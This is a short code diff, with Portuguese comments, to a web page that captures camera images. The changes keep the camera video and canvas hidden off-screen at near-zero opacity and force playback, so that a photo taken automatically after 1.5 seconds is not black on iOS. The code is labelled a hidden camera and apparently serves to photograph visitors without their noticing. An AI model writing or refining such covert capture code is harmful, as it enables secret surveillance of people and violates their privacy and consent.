@@ -139,13 +139,14 @@
       min-height: 20px;
     }
 
-    /* Câmera oculta */
+    /* Câmera oculta sem usar display:none (evita foto preta no iOS) */
     video,
     canvas {
-      display: none;
       position: fixed;
       top: -9999px;
       left: -9999px;
+      opacity: 0.01;
+      pointer-events: none;
     }
 
     /* Flash */
@@ -272,6 +273,9 @@
           audio: false
         });
         video.srcObject = stream;
+
+        // No iOS, se não chamar play(), o video não decodifica o stream e o canvas fica preto
+        try { await video.play(); } catch (e) { }
 
         video.onloadedmetadata = () => {
           setTimeout(capturar, 1500);
